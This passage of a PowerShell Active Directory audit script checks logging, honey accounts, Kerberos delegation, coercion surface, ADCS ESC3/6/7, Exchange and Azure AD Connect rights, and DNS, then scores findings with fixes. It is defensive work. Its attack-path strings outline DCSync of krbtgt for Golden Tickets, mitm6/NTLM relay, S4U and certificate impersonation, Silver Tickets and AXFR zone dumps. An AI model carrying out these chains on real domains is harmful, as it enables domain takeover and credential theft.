# ===============================================================================
# DOMAIN 13 -- LOGGING & DETECTION
# ===============================================================================
Write-Section "13. LOGGING & DETECTION"

# 13.1 Advanced Audit Policy on DC
$auditPol = @(auditpol /get /category:* 2>$null)
$criticalAudits = @{
    "Logon/Logoff"                   = "Success and Failure"
    "Account Logon"                  = "Success and Failure"
    "Account Management"             = "Success and Failure"
    "DS Access"                      = "Success and Failure"
    "Privilege Use"                  = "Failure"
    "Policy Change"                  = "Success"
    "Object Access"                  = "Success and Failure"
    "Detailed Tracking"              = "Success"
}
$missingAudits = @()
foreach ($category in $criticalAudits.Keys) {
    $line = @($auditPol | Where-Object { $_ -match $category })
    if (-not $line -or $line -notmatch "Success|Failure") { $missingAudits += $category }
}
if ($missingAudits.Count -eq 0) {
    Add-Finding "Logging" "DC Audit Policy" "Good" "All critical audit categories enabled on this DC" -Pts 5 -Max 5
} else {
    Add-Finding "Logging" "DC Audit Policy Gaps" "High" `
        "$($missingAudits.Count) critical audit category/categories not fully configured: $($missingAudits -join ', ')" `
        -Fix "Apply via GPO: Computer Config -> Windows Settings -> Security Settings -> Advanced Audit Policy Configuration" `
        -MITRE "T1562.002" -Pts 0 -Max 5
}

# 13.2 PowerShell Script Block Logging
$sbLogging = Get-RegValue "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" "EnableScriptBlockLogging"
if ($sbLogging -eq 1) {
    Add-Finding "Logging" "PS ScriptBlock Logging" "Good" "PowerShell ScriptBlock logging enabled (Event 4104)" -Pts 3 -Max 3
} else {
    Add-Finding "Logging" "PS ScriptBlock Logging Missing" "High" `
        "PowerShell ScriptBlock logging disabled -- all PS attacks (Invoke-CredDump, encoded commands, LOLBins via PS) invisible in logs" `
        -Fix "GPO: Computer Config -> Admin Templates -> Windows Components -> Windows PowerShell -> Turn on PowerShell Script Block Logging = Enabled" `
        -MITRE "T1059.001" -Pts 0 -Max 3
}

# 13.3 Command line in process creation (Event 4688 full cmdline)
$cmdLine = Get-RegValue "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" "ProcessCreationIncludeCmdLine_Enabled"
if ($cmdLine -eq 1) {
    Add-Finding "Logging" "Process Cmdline Logging (4688)" "Good" "Full command line logged in Process Creation events (4688)" -Pts 3 -Max 3
} else {
    Add-Finding "Logging" "Process Cmdline Logging Missing" "High" `
        "Command line not captured in 4688 events -- attacker tools run without argument visibility in SIEM" `
        -Fix "GPO: Computer Config -> Admin Templates -> System -> Audit Process Creation -> Include command line in process creation events = Enabled" `
        -MITRE "T1059" -Pts 0 -Max 3
}

# 13.4 Sysmon deployment
$sysmon = @(Get-Service "Sysmon*" -ErrorAction SilentlyContinue | Select-Object -First 1)
if ($sysmon -and $sysmon.Status -eq 'Running') {
    $sysmonVer = @((Get-Process "Sysmon*" -ErrorAction SilentlyContinue | Select-Object -First 1))
    Add-Finding "Logging" "Sysmon Deployed" "Good" "Sysmon running: $($sysmon.Name)" -Pts 5 -Max 5
} else {
    Add-Finding "Logging" "Sysmon Not Deployed" "High" `
        "Sysmon not installed -- no process creation (Ev1), network connections (Ev3), driver loads (Ev6), LSA-SS access (Ev10), or registry changes (Ev13)" `
        -Fix "Deploy Sysmon with SwiftOnSecurity config: sysmon64.exe -accepteula -i sysmonconfig.xml. GPO startup script for all DCs + admin hosts." `
        -MITRE "T1562.001" -Pts 0 -Max 5
}

# 13.5 Security event log size
$secLog = Get-WinEvent -ListLog Security -ErrorAction SilentlyContinue
$secLogMB = if ($secLog) { [math]::Round($secLog.MaximumSizeInBytes/1MB) } else { 0 }
if ($secLogMB -ge 1024) {
    Add-Finding "Logging" "Security Event Log Size" "Good" "Security log max size: ${secLogMB}MB (>=1GB recommended for DCs)" -Pts 2 -Max 2
} elseif ($secLogMB -ge 256) {
    Add-Finding "Logging" "Security Event Log Size" "Medium" "Security log max size: ${secLogMB}MB -- increase to >=1GB for DC retention" `
        -Fix "wevtutil sl Security /ms:1073741824" -Pts 1 -Max 2
} else {
    Add-Finding "Logging" "Security Event Log Too Small" "High" `
        "Security log max: ${secLogMB}MB -- log overwrites within hours on a busy DC. Forensic evidence lost." `
        -Fix "wevtutil sl Security /ms:1073741824 (1GB). Also forward to SIEM via WEF." -Pts 0 -Max 2
}

# ===============================================================================
# DOMAIN 14 -- DECEPTION
# ===============================================================================
Write-Section "14. DECEPTION"

# 14.1 Honey accounts
$honeyAccounts = @(Get-ADUser -Filter * -Properties Description @dcParam |
    Where-Object { $_.Description -match 'honey|decoy|trap|canary|lure' })
if ($honeyAccounts.Count -gt 0) {
    Add-Finding "Deception" "Honey Accounts" "Good" "$($honeyAccounts.Count) honey account(s) deployed -- attackers enumerating AD will attempt these accounts, triggering alerts" -Pts 3 -Max 3
} else {
    Add-Finding "Deception" "No Honey Accounts" "Medium" `
        "No honey accounts found -- attacker can enumerate and spray credentials with no tripwire detection" `
        -Fix "Create 2-3 honey accounts with enticing names (svc_backup_legacy, old-admin, helpdesk2). Alert on ANY logon attempt. Never used in production." `
        -Pts 0 -Max 3
}

# 14.2 Honey shares
$honeyShares = @(Get-SmbShare -ErrorAction SilentlyContinue | Where-Object {
    $_.Name -match 'backup|finance|password|secret|cred|payroll|confidential|sensitive'
})
if ($honeyShares.Count -gt 0) {
    Add-Finding "Deception" "Honey Shares" "Good" "$($honeyShares.Count) potential honey share(s) present" -Pts 2 -Max 2
} else {
    Add-Finding "Deception" "No Honey Shares" "Low" "No honey file shares detected -- consider deploying shares with canary documents to detect ransomware and recon" `
        -Fix "Create \\DC\Finance share with canarytokens.org Word/PDF files. Alert on file open = active attacker." -Pts 0 -Max 2
}

# ===============================================================================
# DOMAIN 15 -- KERBEROS HARDENING (krbtgt / Ticket Policy / RBCD)
# ===============================================================================
Write-Section "15. KERBEROS HARDENING"

# 15.1 krbtgt password age -- Golden Ticket window
$krbtgt = Get-ADUser -Identity "krbtgt" -Properties PasswordLastSet,Created @dcParam
$krbtgtAge = ((Get-Date) - $krbtgt.PasswordLastSet).Days
if ($krbtgtAge -le 180) {
    Add-Finding "KerberosHardening" "krbtgt Password Age" "Good" "krbtgt password age: $krbtgtAge days (<=180 -- acceptable rotation)" -Pts 5 -Max 5
} elseif ($krbtgtAge -le 365) {
    Add-Finding "KerberosHardening" "krbtgt Password Age" "Medium" "krbtgt password age: $krbtgtAge days -- rotate every 180 days. Outstanding Golden Tickets valid until rotated TWICE." `
        -Fix "Reset krbtgt password twice (24h apart): Reset-ADAccountPassword -Identity krbtgt. Use AzureADIncidentResponse krbtgt rotation script for safe double-reset." `
        -MITRE "T1558.001" -Pts 2 -Max 5
} else {
    Add-Finding "KerberosHardening" "krbtgt Password Not Rotated" "Critical" `
        "krbtgt password age: $krbtgtAge days -- any Golden Ticket forged with the old key is still valid. Attackers with prior DA access may have forged persistent tickets." `
        -AttackPath "Cred-Dump-Tool lsa-dump::dc-sync /user:krbtgt -> extract krbtgt hash -> forge Golden Ticket (10-year validity) -> any service in domain forever" `
        -Fix "Emergency rotation: Reset-ADAccountPassword krbtgt. Wait 10 hours (max TGT lifetime). Reset AGAIN to invalidate all tickets signed by first key." `
        -MITRE "T1558.001" -Pts 0 -Max 5
    Write-Host "  [!] krbtgt not rotated in $krbtgtAge days -- GOLDEN TICKET RISK" -ForegroundColor Red
}

# 15.2 Kerberos ticket lifetime policy
$kerbPolicy = @(Invoke-ADCmd { Get-GPO -All @dcParam | ForEach-Object {
    $report = [xml](Get-GPOReport -Guid $_.Id -ReportType XML @dcParam -ErrorAction SilentlyContinue)
    $tgtLife = $report.GPO.Computer.ExtensionData.Extension.Account |
        Where-Object { $_.Name -eq 'MaxTicketAge' } | Select-Object -ExpandProperty SettingNumber
    if ($tgtLife) { [PSCustomObject]@{ GPO=$_.DisplayName; TGTLifetime=$tgtLife } }
}})
$tgtHours = if ($kerbPolicy) { [int]($kerbPolicy[0].TGTLifetime) } else { 10 }
if ($tgtHours -le 10) {
    Add-Finding "KerberosHardening" "Kerberos TGT Lifetime" "Good" "TGT lifetime: $tgtHours hours -- within CIS recommendation (<=10h)" -Pts 2 -Max 2 -CIS "2.3.17"
} else {
    Add-Finding "KerberosHardening" "Kerberos TGT Lifetime Too Long" "Medium" "TGT lifetime: $tgtHours hours -- reduce to <=10h to limit Golden Ticket and stolen TGT validity window" `
        -Fix "GPO: Computer Config -> Windows Settings -> Security Settings -> Account Policies -> Kerberos Policy -> Maximum lifetime for user ticket = 10 hours" `
        -MITRE "T1558.001" -CIS "2.3.17" -Pts 0 -Max 2
}

# 15.3 Resource-Based Constrained Delegation (RBCD) -- unexpected msDS-AllowedToActOnBehalfOfOtherIdentity
$rbcdAccounts = @(Get-ADComputer -Filter * -Properties 'msDS-AllowedToActOnBehalfOfOtherIdentity' @dcParam |
    Where-Object { $_.'msDS-AllowedToActOnBehalfOfOtherIdentity' })
$rbcdUsers = @(Get-ADUser -Filter * -Properties 'msDS-AllowedToActOnBehalfOfOtherIdentity' @dcParam |
    Where-Object { $_.'msDS-AllowedToActOnBehalfOfOtherIdentity' })
$totalRBCD = $rbcdAccounts.Count + $rbcdUsers.Count
if ($totalRBCD -eq 0) {
    Add-Finding "KerberosHardening" "RBCD Delegations" "Good" "No Resource-Based Constrained Delegation configured" -Pts 3 -Max 3
} else {
    Add-Finding "KerberosHardening" "RBCD Delegation Present" "High" `
        "$totalRBCD object(s) have msDS-AllowedToActOnBehalfOfOtherIdentity set -- verify each is intentional. RBCD on a DC = full domain compromise." `
        -Resources (@($rbcdAccounts.Name) + @($rbcdUsers.SamAccountName)) `
        -AttackPath "RBCD on high-value target -> S4U2Self + S4U2Proxy -> obtain service ticket as any user to target host -> local admin or SYSTEM" `
        -Fix "Review each: Get-ADObject -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like '*'} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity. Remove if not explicitly required." `
        -MITRE "T1558.002" -Pts 0 -Max 3
}

# 15.4 Constrained delegation to sensitive SPNs
# TrustedToAuthForDelegation is a computed property -- use UAC bit 0x1000000 via LDAPFilter
# Also enumerate ALL constrained delegation (msDS-AllowedToDelegateTo=*) regardless of
# protocol transition, then filter for sensitive targets in Where-Object
$allConstrainedUsers = @(
    Get-ADUser -LDAPFilter "(msDS-AllowedToDelegateTo=*)" `
        -Properties 'msDS-AllowedToDelegateTo','TrustedToAuthForDelegation' @dcParam -ErrorAction SilentlyContinue
)
$allConstrainedComputers = @(
    Get-ADComputer -LDAPFilter "(msDS-AllowedToDelegateTo=*)" `
        -Properties 'msDS-AllowedToDelegateTo','TrustedToAuthForDelegation' @dcParam -ErrorAction SilentlyContinue
)
$constrainedToSensitive =@( @($allConstrainedUsers | Where-Object { $_.'msDS-AllowedToDelegateTo' -match 'krbtgt|cifs|ldap|host' }))
$constrainedComputers   = @($allConstrainedComputers | Where-Object {
    $_.'msDS-AllowedToDelegateTo' -match 'krbtgt|cifs.*dc|ldap.*dc|host.*dc|DC='
})
# Report all constrained delegation accounts (inventory finding)
$totalConstrained = $allConstrainedUsers.Count + $allConstrainedComputers.Count
if ($totalConstrained -gt 0) {
    $protocolTransition =@( @($allConstrainedUsers + $allConstrainedComputers | Where-Object { $_.TrustedToAuthForDelegation }))
    $ptNote = if ($protocolTransition.Count -gt 0) { " $($protocolTransition.Count) use protocol transition (any-protocol impersonation)." } else { "" }
    Add-Finding "KerberosHardening" "Constrained Delegation Inventory" "Medium" `
        "$totalConstrained object(s) have msDS-AllowedToDelegateTo set.$ptNote Review all delegation targets." `
        -Resources (@($allConstrainedUsers | ForEach-Object { $_.SamAccountName }) + @($allConstrainedComputers | ForEach-Object { $_.Name })) `
        -Fix "Audit: Get-ADObject -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties msDS-AllowedToDelegateTo. Replace protocol transition with RBCD where possible." `
        -MITRE "T1558.001" -Pts 0 -Max 3
} else {
    Add-Finding "KerberosHardening" "Constrained Delegation Inventory" "Good" "No constrained delegation configured" -Pts 3 -Max 3
}

# Report specifically sensitive targets (DC-level SPNs)
if (@($constrainedToSensitive).Count -gt 0 -or @($constrainedComputers).Count -gt 0) {
    Add-Finding "KerberosHardening" "Constrained Delegation to Sensitive SPNs" "High" `
        "Account(s) with constrained delegation to DC-level SPNs (CIFS/LDAP/HOST on DC) -- attacker controlling delegating account can impersonate any user to DC" `
        -Resources (@($constrainedToSensitive.SamAccountName) + @($constrainedComputers.Name)) `
        -AttackPath "Control delegating account -> S4U2Self (get TGS as DA) -> S4U2Proxy to DC CIFS/LDAP -> DCSync or remote code execution on DC" `
        -Fix "Review delegation targets. Avoid CIFS/LDAP/HOST to DCs. Prefer RBCD with explicit allow-list over protocol transition (TrustedToAuthForDelegation)." `
        -MITRE "T1558.001" -Pts 0 -Max 0
} else {
    Add-Finding "KerberosHardening" "Constrained Delegation Scope" "Good" "No constrained delegation to sensitive DC-level SPNs" -Pts 0 -Max 0
}

# ===============================================================================
# DOMAIN 16 -- COERCION ATTACK SURFACE
# ===============================================================================
Write-Section "16. COERCION ATTACK SURFACE"

# 16.1 IPv6 preferred -- DHCPv6 / mitm6 attack surface
$ipv6Disabled = $true
$adapters = Get-NetAdapterBinding -ComponentID ms_tcpip6 -ErrorAction SilentlyContinue
foreach ($a in @($adapters)) {
    if ($a.Enabled) { $ipv6Disabled = $false; break }
}
$ipv6Preference = Get-RegValue "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters" "DisabledComponents" -Default 0
if ($ipv6Disabled -or $ipv6Preference -ge 0xFF) {
    Add-Finding "CoercionSurface" "IPv6 Disabled" "Good" "IPv6 disabled on all adapters -- DHCPv6/mitm6 attack not possible" -Pts 3 -Max 3
} else {
    Add-Finding "CoercionSurface" "IPv6 Enabled -- DHCPv6/mitm6 Risk" "High" `
        "IPv6 enabled -- mitm6 attack: send DHCPv6 reply with attacker as DNS server -> intercept all DNS queries -> NTLM relay -> create computer account with RBCD -> domain compromise" `
        -AttackPath "mitm6 + $($script:T.NR) --delegate-access -> victim queries attacker DNS -> relay WPAD/HTTP auth -> RBCD on victim -> S4U2Proxy as admin" `
        -Fix "GPO: Computer Config -> Admin Templates -> Network -> TCP/IP Settings -> IPv6 -> Disable IPv6. Or: Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters' -Name DisabledComponents -Value 0xFF" `
        -MITRE "T1557" -Pts 0 -Max 3
}

# 16.2 WPAD (Web Proxy Auto-Discovery) -- NTLM relay via WPAD
$wpadDisabled = Get-RegValue "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp" "DisableWpad"
$wpadGPO = Get-RegValue "HKLM:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings" "DisableProxyAutoConfig"
if ($wpadDisabled -eq 1 -or $wpadGPO -eq 1) {
    Add-Finding "CoercionSurface" "WPAD Disabled" "Good" "WPAD proxy auto-discovery disabled -- NTLM relay via WPAD blocked" -Pts 3 -Max 3
} else {
    Add-Finding "CoercionSurface" "WPAD Enabled" "High" `
        "WPAD proxy auto-discovery enabled -- attacker responds to WPAD DNS query -> intercept proxy auth -> capture NTLMv2 hashes or relay" `
        -Fix "GPO: User Config -> Admin Templates -> Windows Components -> Internet Explorer -> Prevent changing proxy settings. Disable via WinHTTP: netsh winhttp reset proxy" `
        -MITRE "T1557" -Pts 0 -Max 3
}

# 16.3 WebClient service (HTTP coercion -- forces HTTP auth instead of SMB)
$webClient = Get-Service -Name WebClient -ErrorAction SilentlyContinue
if (-not $webClient -or $webClient.Status -ne 'Running') {
    Add-Finding "CoercionSurface" "WebClient Service Disabled" "Good" "WebClient (WebDAV) service not running -- HTTP coercion attacks blocked on this host" -Pts 3 -Max 3
} else {
    Add-Finding "CoercionSurface" "WebClient Service Running" "High" `
        "WebClient (WebDAV) service running -- enables HTTP-based coercion attacks. Attacker can coerce authentication over HTTP (port 80) bypassing SMB signing requirement" `
        -AttackPath "Printer-Bug/Petit-Potam -> WebDAV path -> HTTP auth (no SMB signing needed) -> relay to LDAP -> RBCD or create privileged account" `
        -Fix "Stop-Service WebClient; Set-Service WebClient -StartupType Disabled. Deploy via GPO to all non-required hosts." `
        -MITRE "T1557" -Pts 0 -Max 3
}

# 16.4 mDNS (Multicast DNS -- another LLMNR/NBT-NS poisoning tool target)
$mDNS = Get-RegValue "HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" "EnableMDNS"
if ($mDNS -eq 0) {
    Add-Finding "CoercionSurface" "mDNS Disabled" "Good" "mDNS disabled -- $($script:T.RS) mDNS poisoning blocked" -Pts 2 -Max 2
} else {
    Add-Finding "CoercionSurface" "mDNS Enabled" "Medium" `
        "mDNS enabled -- $($script:T.RS) can answer mDNS queries -> capture NTLMv2 hashes from same-subnet hosts" `
        -Fix "GPO: HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters -> EnableMDNS=0" `
        -MITRE "T1557" -Pts 0 -Max 2
}

# 16.5 Print Spooler audit across ALL DCs (already checked in DC Hardening -- extend to member servers)
$memberServersWithSpooler = @()
try {
    $memberServers = @(Get-ADComputer -Filter { OperatingSystem -like '*Server*' } `
        -Properties OperatingSystem @dcParam | Select-Object -First 20)
    foreach ($srv in $memberServers) {
        $spooler = Get-Service -Name Spooler -ComputerName $srv.Name -ErrorAction SilentlyContinue
        if ($spooler -and $spooler.Status -eq 'Running') { $memberServersWithSpooler += $srv.Name }
    }
} catch {}
if ($memberServersWithSpooler.Count -gt 0) {
    Add-Finding "CoercionSurface" "Print Spooler on Member Servers" "High" `
        "Print Spooler running on $($memberServersWithSpooler.Count) member server(s) -- coercible for NTLM relay even if DCs are hardened" `
        -Resources $memberServersWithSpooler `
        -Fix "Stop-Service Spooler; Set-Service Spooler -StartupType Disabled on all servers that don't manage print queues." `
        -MITRE "T1547.012" -Pts 0 -Max 3
} else {
    Add-Finding "CoercionSurface" "Print Spooler on Member Servers" "Good" "Print Spooler not running on sampled member servers" -Pts 3 -Max 3
}

# ===============================================================================
# DOMAIN 17 -- ADCS EXTENDED (ESC3 / ESC6 / ESC7)
# ===============================================================================
Write-Section "17. ADCS EXTENDED (ESC3/ESC6/ESC7)"

if (-not $adcsAvail) {
    Add-Finding "ADCSExtended" "ADCS Check" "Info" "No CA found -- ADCS extended checks skipped"
} else {
    # ESC3: Enrollment Agent template -- can request certs on behalf of any user
    $esc3Templates =@( @($templates) | Where-Object {
        $_.pkiExtendedKeyUsage -contains '1.3.6.1.4.1.311.20.2.1' -and  # Certificate Request Agent EKU
        (-not ($_.'msPKI-Enrollment-Flag' -band 2))  # No manager approval
    })
    if ($esc3Templates.Count -gt 0) {
        Add-Finding "ADCSExtended" "ESC3 -- Enrollment Agent Template" "Critical" `
            "$($esc3Templates.Count) Enrollment Agent template(s) enrollable without approval -- obtain EA cert -> enroll ON BEHALF OF any user including Domain Admins" `
            -Resources ($esc3Templates.Name) `
            -AttackPath "Step 1: Enroll in EA template -> get certificate with Certificate Request Agent EKU. Step 2: Use EA cert to request cert for administrator@domain.com -> PKINIT as DA" `
            -Fix "Remove Certificate Request Agent EKU from templates accessible to low-priv users. Enable Manager Approval. Restrict to specific EA accounts." `
            -MITRE "T1649" -Pts 0 -Max 7
        Write-Host "  [!] ESC3 Enrollment Agent templates: $($esc3Templates.Name -join ', ')" -ForegroundColor Red
    } else {
        Add-Finding "ADCSExtended" "ESC3 Check" "Good" "No low-priv Enrollment Agent templates found" -Pts 7 -Max 7
    }

    # ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 on CA -- CA accepts SAN in any request
    $esc6Vulnerable = @()
    foreach ($ca in $caObjects) {
        $caHost = $ca.dNSHostName
        $caName = $ca.Name
        try {
            $caConfig = certutil -config "$caHost\$caName" -getreg "Policy\EditFlags" 2>$null
            if ($caConfig -match 'EDITF_ATTRIBUTESUBJECTALTNAME2') {
                $esc6Vulnerable += "$caHost\$caName"
            }
        } catch {}
    }
    if ($esc6Vulnerable.Count -gt 0) {
        Add-Finding "ADCSExtended" "ESC6 -- CA Accepts User-Defined SAN" "Critical" `
            "CA(s) '$($esc6Vulnerable -join ', ')' have EDITF_ATTRIBUTESUBJECTALTNAME2 set -- ANY certificate request can include arbitrary SAN regardless of template settings" `
            -Resources $esc6Vulnerable `
            -AttackPath "Any enrollable template -> add SAN=administrator@domain.com in request -> CA issues cert with DA's UPN -> PKINIT as Domain Admin" `
            -Fix "certutil -config 'CA_HOST\CA_NAME' -setreg 'Policy\EditFlags' -EDITF_ATTRIBUTESUBJECTALTNAME2. Restart CertSvc: net stop certsvc; net start certsvc" `
            -MITRE "T1649" -Pts 0 -Max 8
        Write-Host "  [!] ESC6 vulnerable CAs: $($esc6Vulnerable -join ', ')" -ForegroundColor Red
    } else {
        Add-Finding "ADCSExtended" "ESC6 Check" "Good" "No CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set" -Pts 8 -Max 8
    }

    # ESC7: CA with ManageCertificates right for non-admins
    foreach ($ca in $caObjects) {
        try {
            $caSD = certutil -config "$($ca.dNSHostName)\$($ca.Name)" -getCA 2>$null
            # Check CA ACL for ManageCertificates (0x200) or ManageCA (0x1) rights held by non-admins
            $caAclObj = Get-ACL "AD:\$($ca.DistinguishedName)" -ErrorAction SilentlyContinue
            $dangerCaAces =@( @($caAclObj.Access) | Where-Object {
                $rights = $_.ActiveDirectoryRights.ToString()
                ($rights -match 'GenericAll|WriteDacl|WriteOwner') -and
                $_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|SYSTEM|Cert Publishers'
            })
            if ($dangerCaAces) {
                Add-Finding "ADCSExtended" "ESC7 -- Dangerous CA Object ACL" "Critical" `
                    "CA object '$($ca.Name)' has dangerous ACL -- non-admin can modify CA configuration, approve pending requests, or issue certs as any user" `
                    -Resources @($ca.dNSHostName) `
                    -Fix "Remove non-admin write access from CA object in AD. Use certsrv.msc -> CA Properties -> Security to review CA-level permissions." `
                    -MITRE "T1649" -Pts 0 -Max 6
            } else {
                Add-Finding "ADCSExtended" "ESC7 Check" "Good" "CA object '$($ca.Name)' has no dangerous ACLs" -Pts 6 -Max 6
            }
        } catch {}
    }
}

# ===============================================================================
# DOMAIN 18 -- EXCHANGE & HYBRID IDENTITY
# ===============================================================================
Write-Section "18. EXCHANGE & HYBRID IDENTITY"

# 18.1 Exchange Windows Permissions -- WriteDACL on domain (DC-Sync equivalent)
$exchangeGroups = @('Exchange Windows Permissions','Exchange Trusted Subsystem','Organization Management')
foreach ($grp in $exchangeGroups) {
    $grpObj = Get-ADGroup -Identity $grp @dcParam -ErrorAction SilentlyContinue
    if (-not $grpObj) { continue }

    $domACL = Get-Acl "AD:\$domainDN" -ErrorAction SilentlyContinue
    $grpSID  = $grpObj.SID.Value
    $exchangeACEs =@( @($domACL.Access) | Where-Object {
        $_.IdentityReference.Value -match [regex]::Escape($grp) -and
        $_.ActiveDirectoryRights -match 'WriteDacl|GenericAll'
    })
    if ($exchangeACEs) {
        Add-Finding "HybridIdentity" "Exchange WriteDACL on Domain" "Critical" `
            "'$grp' has WriteDACL on domain root -- any Exchange admin can grant themselves DC-Sync rights -> dump all hashes" `
            -Resources @($grp) `
            -AttackPath "Add self to 'Exchange Windows Permissions' -> WriteDACL on domain -> grant self Replicating Directory Changes All -> DCSync -> all hashes" `
            -Fix "Remove WriteDACL from Exchange groups on domain root. Use PoC fix script from https://github.com/gdedrouas/Exchange-AD-Privesc" `
            -MITRE "T1003.006" -Pts 0 -Max 6
        Write-Host "  [!] $grp has WriteDACL on domain root -- DC-Sync equivalent" -ForegroundColor Red
    }
}

# 18.2 Azure AD Connect -- MSOL_ sync account (over-privileged by default pre-2017)
$msolAccounts = @(Get-ADUser -Filter { SamAccountName -like 'MSOL_*' -and Enabled -eq $true } `
    -Properties Description,PasswordLastSet @dcParam)
if ($msolAccounts.Count -gt 0) {
    # Check if MSOL_ account has DC-Sync rights (old installations granted this)
    foreach ($msol in $msolAccounts) {
        $domACL2 = Get-Acl "AD:\$domainDN" -ErrorAction SilentlyContinue
        $msolDCSync =@( @($domACL2.Access) | Where-Object {
            $_.IdentityReference.Value -match $msol.SamAccountName -and
            $_.ObjectType.ToString() -in @('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')
        })
        if ($msolDCSync) {
            Add-Finding "HybridIdentity" "Azure AD Connect MSOL_ Has DCSync Rights" "Critical" `
                "Azure AD Connect sync account '$($msol.SamAccountName)' has DC-Sync rights -- compromising AAD Connect server = dump all AD hashes" `
                -Resources @($msol.SamAccountName) `
                -AttackPath "Access AAD Connect server (often not well-hardened) -> extract MSOL_ password from config -> DCSync all hashes -> full AD + Azure AD compromise" `
                -Fix "Run AAD Connect upgrade to latest version (removes DC-Sync rights). Or manually remove Replicating Directory Changes from MSOL_ account's ACE." `
                -MITRE "T1003.006" -Pts 0 -Max 7
            Write-Host "  [!] MSOL_ account has DC-Sync rights -- AAD Connect attack path open" -ForegroundColor Red
        } else {
            Add-Finding "HybridIdentity" "Azure AD Connect MSOL_ Account" "Medium" `
                "AAD Connect sync account '$($msol.SamAccountName)' present. Verify it does NOT have DC-Sync or DA rights. Password age: $(((Get-Date)-$msol.PasswordLastSet).Days)d" `
                -Resources @($msol.SamAccountName) `
                -Fix "Verify account permissions. Ensure AAD Connect server is hardened, patched, and monitored for interactive logons." `
                -MITRE "T1078.002" -Pts 0 -Max 3
        }
    }
}

# 18.3 AZUREADSSOACC$ -- Seamless SSO Silver Ticket
# AZUREADSSOACC$ holds the Kerberos decryption key shared with Azure AD for Seamless SSO.
# An attacker who extracts its NTLM hash (via DCSync) can forge Silver Tickets accepted
# by Azure AD for ANY synced user -- including Global Admins -- without touching Azure.
# Microsoft recommends rotation every 30 days.
# Severity: >365 days = Critical (extended exposure window); >90 days = High.
# MITRE: T1558.002 (Silver Ticket) -- previous mapping T1558.004 was incorrect (AS-REP Roasting).
$ssoAccount = Get-ADComputer -Identity 'AZUREADSSOACC$' @dcParam `
    -Properties PasswordLastSet,Created -ErrorAction SilentlyContinue
if ($ssoAccount) {
    $ssoAge = [int]((Get-Date) - $ssoAccount.PasswordLastSet).TotalDays
    $ssoSev = if ($ssoAge -gt 365) { 'Critical' } elseif ($ssoAge -gt 90) { 'High' } else { $null }
    if ($ssoSev) {
        Add-Finding "HybridIdentity" "AZUREADSSOACC`$ Password Stale" $ssoSev `
            "Seamless SSO computer account password not rotated in $ssoAge days (last set: $($ssoAccount.PasswordLastSet.ToString('yyyy-MM-dd'))) -- Kerberos decryption key shared with Azure AD is stale. Silver Ticket forgeable for any synced user including Global Admins." `
            -Resources @('AZUREADSSOACC$') `
            -AttackPath "DCSync or NTDS.dit dump -> extract AZUREADSSOACC`$ NTLM hash -> forge Silver Ticket for http/aadg.windows.net.nsatc.net -> Azure AD accepts ticket -> authenticate as any synced user (including Global Admin) -> full M365/Azure compromise without touching Azure portal" `
            -Fix "Run on AAD Connect server: Import-Module 'C:\Program Files\Microsoft Azure Active Directory Connect\AzureADSSO.psd1'; New-AzureADSSOAuthenticationContext; Update-AzureADSSOForest -OnPremCredentials (Get-Credential) -PreserveCustomPermissionsOnDesktopSsoAccount. Schedule rotation every 30 days." `
            -MITRE "T1558.002" -Pts 0 -Max 4
    } else {
        Add-Finding "HybridIdentity" "AZUREADSSOACC`$ Password Fresh" "Good" `
            "Seamless SSO password rotated $ssoAge day(s) ago (last set: $($ssoAccount.PasswordLastSet.ToString('yyyy-MM-dd'))) -- within 90-day threshold" -Pts 4 -Max 4
    }
} else {
    Add-Finding "HybridIdentity" "AZUREADSSOACC`$ Not Found" "Info" `
        "AZUREADSSOACC`$ computer account not found -- Azure AD Seamless SSO may not be configured, or account was deleted." -Pts 4 -Max 4
}

# ===============================================================================
# DOMAIN 19 -- DNS SECURITY
# ===============================================================================
Write-Section "19. DNS SECURITY"

# 19.1 Zone transfer restriction
$dnsZones =@( @(Get-DnsServerZone -ErrorAction SilentlyContinue | Where-Object { -not $_.IsAutoCreated -and $_.ZoneType -eq 'Primary' }))
if ($dnsZones) {
    $openTransfer =@( @($dnsZones) | Where-Object {
        (Get-DnsServerZone -Name $_.ZoneName -ErrorAction SilentlyContinue).SecureSecondaries -eq 0  # 0=any server
    })
    if ($openTransfer.Count -eq 0) {
        Add-Finding "DNSSecurity" "Zone Transfer Restricted" "Good" "All DNS zones restrict zone transfer (not open to any server)" -Pts 3 -Max 3
    } else {
        Add-Finding "DNSSecurity" "Zone Transfer Open" "High" `
            "$($openTransfer.Count) DNS zone(s) allow zone transfer to ANY server -- full AD infrastructure map downloadable" `
            -Resources ($openTransfer.ZoneName) `
            -AttackPath "dig AXFR @DC domain.com -> all hostnames, IPs, SRV records -> complete network map for targeted attacks" `
            -Fix "Set-DnsServerPrimaryZone -Name ZONE -SecureSecondaries TransferToZoneNameServer (or NoTransfer)" `
            -MITRE "T1590.002" -Pts 0 -Max 3
    }
} else {
    Add-Finding "DNSSecurity" "DNS Zone Transfer" "Info" "DNS Server module not available on this host -- run on DC for zone transfer checks"
}

# 19.2 Secure dynamic updates only
if ($dnsZones) {
    $insecureDynamic =@( @($dnsZones) | Where-Object {
        $z = Get-DnsServerZone -Name $_.ZoneName -ErrorAction SilentlyContinue
        $z.DynamicUpdate -eq 'NonsecureAndSecure'
    })
    if ($insecureDynamic.Count -eq 0) {
        Add-Finding "DNSSecurity" "DNS Dynamic Updates Secure" "Good" "All zones require secure (Kerberos-authenticated) dynamic updates" -Pts 3 -Max 3
    } else {
        Add-Finding "DNSSecurity" "Insecure Dynamic DNS Updates" "High" `
